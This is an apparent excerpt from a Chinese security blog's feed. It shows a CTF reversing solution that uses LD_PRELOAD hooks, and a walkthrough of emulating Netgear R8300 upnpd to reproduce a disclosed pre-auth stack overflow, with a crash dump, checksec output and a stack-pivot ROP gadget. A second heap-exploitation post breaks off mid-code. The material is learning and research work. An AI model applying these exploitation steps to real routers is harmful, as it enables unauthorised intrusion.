    <link href="http://s1nec-1o.github.io/2025/03/03/%E5%9B%BA%E4%BB%B6%E4%B8%8B%E7%9A%84hook-patch/"/>
    <id>http://s1nec-1o.github.io/2025/03/03/%E5%9B%BA%E4%BB%B6%E4%B8%8B%E7%9A%84hook-patch/</id>
    <published>2025-03-03T08:26:16.000Z</published>
    <updated>2025-03-03T08:31:04.581Z</updated>
    
    <content type="html"><![CDATA[<h1 id="固件下的how2hook-how2patch"><a href="#固件下的how2hook-how2patch" class="headerlink" title="固件下的how2hook &amp; how2patch"></a>固件下的how2hook &amp; how2patch</h1><p>在模拟固件的时候通常需要我们自己对二进制文件进行patch和hook，但无论是patch还是hook，都是通过修改（劫持）二进制文件的执行流程来达到固件顺利启动的目的。</p><h2 id="BIN-100"><a href="#BIN-100" class="headerlink" title="BIN-100"></a>BIN-100</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">qmemcpy</span>(encoded_flag, &amp;byte_400A7E, <span class="built_in">sizeof</span>(encoded_flag));</span><br><span class="line">  stack_canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  data_pointer = obfuscated_key;</span><br><span class="line">  <span class="keyword">for</span> ( index_outer_loop = <span class="number">9LL</span>; index_outer_loop; --index_outer_loop )</span><br><span class="line">    *data_pointer++ = <span class="number">0</span>;</span><br><span class="line">  remaining_iterations = <span class="number">0x31337</span>;</span><br><span class="line">  initial_time = <span class="built_in">time</span>(<span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i != <span class="number">36</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      current_length = <span class="number">0LL</span>;</span><br><span class="line">      current_time = <span class="built_in">time</span>(<span class="number">0LL</span>);</span><br><span class="line">      <span class="built_in">srand</span>(<span class="number">0xDEFACED</span> - initial_time + current_time);</span><br><span class="line">      previous_byte = obfuscated_key[i];</span><br><span class="line">      obfuscated_key[i] = <span class="built_in">rand</span>() ^ previous_byte;</span><br><span class="line">      funny_element = (&amp;funny)[i];</span><br><span class="line">      <span class="keyword">while</span> ( current_length &lt; <span class="built_in">strlen</span>(funny_element) )</span><br><span class="line">      &#123;</span><br><span class="line">        character_value = funny_element[current_length];</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)character_value == <span class="string">&#x27;i&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          formatted_string[(<span class="type">int</span>)current_length] = <span class="string">&#x27;i&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (_DWORD)current_length &amp;&amp; funny_element[current_length - <span class="number">1</span>] != <span class="string">&#x27; &#x27;</span> )</span><br><span class="line">            ctype_function = __ctype_toupper_loc();</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            ctype_function = __ctype_tolower_loc();</span><br><span class="line">          formatted_string[(<span class="type">int</span>)current_length] = (*ctype_function)[character_value];</span><br><span class="line">        &#125;</span><br><span class="line">        ++current_length;</span><br><span class="line">      &#125;</span><br><span class="line">      formatted_string[(<span class="type">int</span>)current_length] = <span class="number">0</span>;</span><br><span class="line">      __printf_chk(<span class="number">1LL</span>, <span class="string">&quot; ♫ %80s ♫\n&quot;</span>, formatted_string);</span><br><span class="line">      <span class="built_in">sleep</span>(<span class="number">1u</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    --remaining_iterations;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( remaining_iterations );</span><br><span class="line">  key_pointer = obfuscated_key;</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;KEY: &quot;</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    byte_value = (<span class="type">unsigned</span> __int8)*key_pointer++;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;%02x &quot;</span>, byte_value);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( key_pointer != encoded_flag );</span><br><span class="line">  flag_index = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;OK YOU WIN. HERE&#x27;S YOUR FLAG: &quot;</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    decoded_char = encoded_flag[flag_index] ^ obfuscated_key[flag_index];</span><br><span class="line">    ++flag_index;</span><br><span class="line">    <span class="built_in">putchar</span>(decoded_char);  <span class="comment">//输出flag</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( flag_index != <span class="number">36</span> );</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实我们发现这个demo的循环次数也算是比较少的，主要在于如何加快这个过程，发现有个sleep(1u)，那么我们可以利用LD_PRELOAD对sleep进行hook，然后nop掉一些无用的函数，如printf</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt; cat hook2.c</span><br><span class="line"><span class="comment">// gcc -shared -fPIC hook2.c -o hook2.so</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> t=<span class="number">0x31337</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">sleep</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> seconds)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    t++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">time</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD=<span class="variable">$PWD</span>/hook2.so ./elf &gt;tmp</span><br><span class="line"><span class="built_in">tail</span> tmp</span><br></pre></td></tr></table></figure><p>得到flag：p4ul_1z_d34d_1z_wh4t_th3_r3c0rd_s4ys</p><h2 id="实战！"><a href="#实战！" class="headerlink" title="实战！"></a>实战！</h2><h3 id="PSV-2020-0211"><a href="#PSV-2020-0211" class="headerlink" title="PSV-2020-0211"></a>PSV-2020-0211</h3><p>netgear R8300 1.0.2.130 的upnp中存在栈溢出的漏洞，主要学习<strong>利用手法</strong>，NVram hook手法，Poc编写 以及 调试技巧</p><ul><li>**UPnP (Universal Plug and Play)**：现在由开放连接基金会管理的是一套网络协议，它允许网络设备无缝地发现彼此在网络上的存在，并为数据共享、通信和娱乐建立功能网络服务。</li></ul><p>UPnP会将某个端口连接到<strong>多播组</strong>，即允许接收其他客户端传输数据（一对多）【或许就是通过这个来使得网络设备可以无缝发现彼此扒】</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202503031630751.png" alt="image-20250228222327229"></p><p>漏洞看着是很简单的，但是由于sub_25E04是通过strcpy来栈溢出的，因此\x00截断便是不可绕过的障碍，而原作者的利用手法值得学习</p><p>启动服务：这次使用用户模式运行</p><p>因为涉及到nvram，使用LD_PRELOAD Hook技术，网上有人已经写好了针对netgear R6250&#x2F;6400的nvram hook，对于R8300也是适用的 <a href="https://github.com/therealsaumil/custom_nvram/blob/master/custom_nvram_r6250.c">https://github.com/therealsaumil/custom_nvram/blob/master/custom_nvram_r6250.c</a></p><p>使用buildroot进行交叉编译</p><p>首先构造buildroot</p><p>下载地址: <a href="https://buildroot.org/download.html%EF%BC%8C%E4%B8%8B%E8%BD%BD%E4%B8%80%E4%B8%AA%E6%9C%80%E6%96%B0%E7%9A%84%E7%89%88%E6%9C%AC">https://buildroot.org/download.html，下载一个最新的版本</a></p><p>然后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/buildroot-2024.11</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure><p>Target Option -&gt; Target Archite… -&gt; Arm little endian</p><p>之后file随便一个nvram的文件，发现是uClibc</p><p>因此toolchain-&gt;C library-&gt;uClibc</p><p>但是在编译之前需要先换源，这样可以节省一大堆的时间</p><p>Build Option -&gt; Mirrors and Download locations -&gt; </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//sources.buildroot.net                              </span></span><br><span class="line">https:<span class="comment">//mirrors.aliyun.com/linux-kernel</span></span><br><span class="line">https:<span class="comment">//mirrors.aliyun.com/gnu </span></span><br><span class="line">https:<span class="comment">//luarocks.cn                         </span></span><br><span class="line">https:<span class="comment">//mirrors.aliyun.com/CPAN</span></span><br></pre></td></tr></table></figure><p>之后多次esc退出，然后执行<code>make toolchain -j4 V=0</code></p><ol><li><strong>images&#x2F;</strong>  <ul><li>存放编译后生成的所有镜像文件，包括内核镜像、加载引导镜像和根文件系统镜像。</li><li>这些镜像用于在目标设备上启动和运行操作系统。</li></ul></li><li><strong>build&#x2F;</strong>  <ul><li>存放所有构建组件的目录，除了交叉编译工具链的组件。</li><li>每个功能对应一个子目录，包含该功能所需的所有组件。</li><li>例如，内核、库、应用程序等在这里进行编译和配置。</li></ul></li><li><strong>staging&#x2F;</strong>  <ul><li>包含一个类似于根文件系统的层次结构。</li><li>这个目录包含已安装的交叉编译工具链和所有为目标板选择的用户空间包。</li><li>用于准备最终的根文件系统。</li></ul></li><li><strong>target&#x2F;</strong>  <ul><li>包含根文件系统的完整结构，但不能直接用于开发板。</li><li>这个目录是构建过程中生成的文件系统的中间状态。</li></ul></li><li><strong>host&#x2F;</strong>  <ul><li>包含构建过程中需要的交叉编译工具集。</li><li>用于在主机系统上编译目标系统的代码。</li><li>提供了编译器、链接器和其他必要的开发工具。</li></ul></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/buildroot<span class="number">-2024.11</span>/output/host/bin </span><br><span class="line"><span class="keyword">export</span> PATH=$PATH:$(pwd)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arm-linux-gcc -c -O2 -fPIC -Wall ./nvram1.c -o ./nvram1.o</span><br><span class="line">arm-linux-gcc -shared -nostdlib  ./nvram1.o -o ./nvram1.so</span><br></pre></td></tr></table></figure><p>之后创建&#x2F;tmp&#x2F;nvram.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">upnpd_debug_level</span>=<span class="number">9</span></span><br><span class="line"><span class="attr">lan_ipaddr</span>=<span class="number">192.168</span>.<span class="number">122.167</span></span><br><span class="line"><span class="attr">hwver</span>=R8500</span><br><span class="line"><span class="attr">friendly_name</span>=R8300</span><br><span class="line"><span class="attr">upnp_enable</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">upnp_turn_on</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">upnp_advert_period</span>=<span class="number">30</span></span><br><span class="line"><span class="attr">upnp_advert_ttl</span>=<span class="number">4</span></span><br><span class="line"><span class="attr">upnp_portmap_entry</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">upnp_duration</span>=<span class="number">3600</span></span><br><span class="line"><span class="attr">upnp_DHCPServerConfigurable</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">wps_is_upnp</span>=<span class="number">0</span></span><br><span class="line"><span class="attr">upnp_sa_uuid</span>=<span class="number">00000000000000000000</span></span><br><span class="line"><span class="attr">lan_hwaddr</span>=AA:BB:CC:DD:EE:FF</span><br></pre></td></tr></table></figure><p>之后的lan_ipaddr还要连接，因此要把ip起起来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ip addr add 192.168.122.167/24 dev virbr0</span><br><span class="line">ip addr show virbr0</span><br></pre></td></tr></table></figure><p>显示对应的ip就代表成功啦</p><p>之后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-arm-static -E LD_PRELOAD=&quot;./nvram1.so ./lib/libdl.so.0&quot; ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo lsof -i | grep qemu                                                                     </span><br><span class="line">qemu-arm- 6267            root    3u  IPv4  93141      0t0  UDP *:1900 </span><br><span class="line">qemu-arm- 6267            root    4u  IPv4  93142      0t0  UDP *:45791 </span><br><span class="line">qemu-arm- 6267            root    5u  IPv4  93143      0t0  TCP *:5000 (LISTEN)</span><br></pre></td></tr></table></figure><p>如此程序就起起来了，就可以开始Poc的编写了</p><p>调试：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-arm-<span class="type">static</span> -g <span class="number">1234</span> -E LD_PRELOAD=<span class="string">&quot;./nvram1.so ./lib/libdl.so.0&quot;</span> ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure><blockquote><p>一开始傻呗了，忘记了用户模式可以直接调试，直接attach pid调试调的是qemu的进程（）</p></blockquote><p>main函数中有</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">daemon</span>(<span class="number">1</span>, <span class="number">1</span>) == <span class="number">-1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">debug</span>(<span class="number">3</span>, <span class="string">&quot;Fail to run as daemon&quot;</span>);</span><br><span class="line">  v13 = _errno_location();</span><br><span class="line">  <span class="built_in">exit</span>(*v13);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>daemon使得当前进程会变成守护进程并保持工作目录不变，但是这个会让该进程脱离gdb的控制，考虑nop掉，成功~</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> R0   <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> R1   <span class="number">0xfffed504</span> ◂— <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> R2   <span class="number">0xfffed504</span> ◂— <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> R3   <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> R4   <span class="number">0x61</span></span><br><span class="line"> R5   <span class="number">0xfffed500</span> ◂— <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> R6   <span class="number">0xfffed504</span> ◂— <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> R7   <span class="number">0xfffed500</span> ◂— <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> R8   <span class="number">0xfffed504</span> ◂— <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> R9   <span class="number">0x10ab</span></span><br><span class="line"> R10  <span class="number">0x1</span></span><br><span class="line"> R11  <span class="number">0xc4584</span> ◂— <span class="number">7</span></span><br><span class="line"> R12  <span class="number">0x553dc</span> —▸ <span class="number">0xff60393c</span> ◂— push &#123;r4, lr&#125; <span class="comment">/* 0xe92d4010 */</span></span><br><span class="line"> SP   <span class="number">0xfffeceb8</span> ◂— <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> PC   <span class="number">0xff603954</span> ◂— ldrb ip, [r3] <span class="comment">/* 0xe5d3c000 */</span></span><br><span class="line">──────────────────────────────────────────────────────────[ DISASM / arm / set emulate on ]──────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">0xff603948</span>    ldrb   r4, [r2]</span><br><span class="line">   <span class="number">0xff60394c</span>    cmp    r4, #<span class="number">0</span></span><br><span class="line">   <span class="number">0xff603950</span>    popeq  &#123;r4, pc&#125;</span><br><span class="line"> ► <span class="number">0xff603954</span>    ldrb   ip, [r3]</span><br><span class="line">   <span class="number">0xff603958</span>    cmp    r4, ip</span><br><span class="line">   <span class="number">0xff60395c</span>    addeq  r2, r2, #<span class="number">1</span></span><br><span class="line">   <span class="number">0xff603960</span>    addeq  r3, r3, #<span class="number">1</span></span><br><span class="line">   <span class="number">0xff603964</span>    beq    #<span class="number">0xff603948</span>                   &lt;<span class="number">0xff603948</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0xff603948</span>    ldrb   r4, [r2]</span><br><span class="line">   <span class="number">0xff60394c</span>    cmp    r4, #<span class="number">0</span></span><br><span class="line">   <span class="number">0xff603950</span>    popeq  &#123;r4, pc&#125;</span><br><span class="line">──────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ sp <span class="number">0xfffeceb8</span> ◂— <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│    <span class="number">0xfffecebc</span> —▸ <span class="number">0xb62c</span> ◂— subs r7, r0, #<span class="number">0</span> <span class="comment">/* 0xe2507000 */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>│    <span class="number">0xfffecec0</span> —▸ <span class="number">0xfffedefd</span> ◂— <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>c│    <span class="number">0xfffecec4</span> —▸ <span class="number">0xfffed574</span> ◂— <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│    <span class="number">0xfffecec8</span> —▸ <span class="number">0x8df9</span> ◂— <span class="number">0xad</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│    <span class="number">0xfffececc</span> —▸ <span class="number">0xfffef5f4</span> ◂— mrchs p9, #<span class="number">1</span>, r3, c2, c1, #<span class="number">1</span> <span class="comment">/* 0x2e323931; &#x27;192.168.122.1&#x27; */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│    <span class="number">0xfffeced0</span> —▸ <span class="number">0xfffed500</span> ◂— <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>c│    <span class="number">0xfffeced4</span> —▸ <span class="number">0x25e80</span> ◂— subs sl, r0, #<span class="number">0</span> <span class="comment">/* 0xe250a000 */</span></span><br><span class="line">────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span> <span class="number">0xff603954</span></span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure><p>发送大量数据就成功发现栈溢出漏洞</p><p>漏洞利用：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">frimware/_R8300-V1<span class="number">.0</span><span class="number">.2</span><span class="number">.130</span>_1<span class="number">.0</span><span class="number">.99</span>.chk.extracted/squashfs-root </span><br><span class="line">&gt; checksec ./usr/sbin/upnpd     </span><br><span class="line">[*] <span class="string">&#x27;/home/s1nec-1o/frimware/_R8300-V1.0.2.130_1.0.99.chk.extracted/squashfs-root/usr/sbin/upnpd&#x27;</span></span><br><span class="line">    Arch:     arm<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8000</span>)</span></span></span><br></pre></td></tr></table></figure><p>没pie，就启用了nx</p><p><code>SSD</code> 公开的<a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/">漏洞细节</a>中给出了一个方案：通过 <code>stack reuse</code> 的方式来绕过该限制。具体思路为，先通过 <code>socket</code> 发送第一次数据，往栈上填充相应的 <code>rop payload</code>，同时保证不会造成程序崩溃；再通过 <code>socket</code> 发送第二次数据用于覆盖栈上的返回地址，填充的返回地址用来实现 <code>stack pivot</code>，即劫持栈指针使其指向第一次发送的 <code>payload</code> 处，然后再复用之前的 <code>payload</code> 以完成漏洞利用。<code>SSD</code> 公开的漏洞细节中的示意图如下。</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202503031630752.png" alt="image-20250301114232391" style="zoom:50%;" /><p>这里借用的ROP有</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000230F</span>0                 ADD             SP, SP, #<span class="number">0x20C</span></span><br><span class="line">.text:<span class="number">000230F</span>4                 ADD             SP, SP, #<span class="number">0x1000</span></span><br><span class="line">.text:<span class="number">000230F</span>8                 POP             &#123;R4-R11,PC&#125;</span><br></pre></td></tr></table></figure><p>升栈并且pop出所有关键寄存器，如此只需要提前构造好对应的payload就可以进行ROP啦！</p><p>这个利用的手法使得一些简单的栈溢出都能变得很危险（学到惹）</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.iotsec-zone.com/article/202">cyberangle</a></p><p><a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/">原作者</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;固件下的how2hook-how2patch&quot;&gt;&lt;a href=&quot;#固件下的how2hook-how2patch&quot; class=&quot;headerlink&quot; title=&quot;固件下的how2hook &amp;amp; how2patch&quot;&gt;&lt;/a&gt;固件下的how2hook &amp;</summary>
      
    
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>how2heap</title>
    <link href="http://s1nec-1o.github.io/2025/02/21/how2heap/"/>
    <id>http://s1nec-1o.github.io/2025/02/21/how2heap/</id>
    <published>2025-02-21T12:41:20.000Z</published>
    <updated>2025-02-21T12:52:11.452Z</updated>
    
    <content type="html"><![CDATA[<h1 id="house-of手法"><a href="#house-of手法" class="headerlink" title="house of手法"></a>house of手法</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>house of的手法只需理解其中的技巧，了解如何从小小的漏洞获得rce</p><h2 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>溢出写、<code>off by one</code>、<code>off by null</code></p><h3 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>可分配大于处于 <code>unsortedbin</code> 的 <code>chunk</code></li></ul><h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用 <code>off by null</code> 修改掉 <code>chunk</code> 的 <code>size</code> 域的 <code>P</code> 位，绕过 <code>unlink</code> 检查，在堆的后向合并过程中构造出 <code>chunk overlapping</code>。</p><ul><li>申请 <code>chunk A、chunk B、chunk C、chunk D</code>，<code>chunk D</code> 用来做 <code>gap</code>，<code>chunk A、chunk C</code> 都要处于 <code>unsortedbin</code> 范围</li><li>释放 <code>A</code>，进入 <code>unsortedbin</code></li><li>对 <code>B</code> 写操作的时候存在 <code>off by null</code>，修改了 <code>C</code> 的 <code>P</code> 位</li><li>释放 <code>C</code> 的时候，堆后向合并，直接把 <code>A、B、C</code> 三块内存合并为了一个 <code>chunk</code>，并放到了 <code>unsortedbin</code> 里面</li><li>读写合并后的大 <code>chunk</code> 可以操作 <code>chunk B</code> 的内容，<code>chunk B</code> 的头</li></ul><h3 id="相关技巧"><a href="#相关技巧" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>虽然该利用技巧至今仍可以利用，但是需要对 <code>unlink</code> 绕过的条件随着版本的增加有所变化。</p><p>最开始的 <code>unlink</code> 的代码是：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 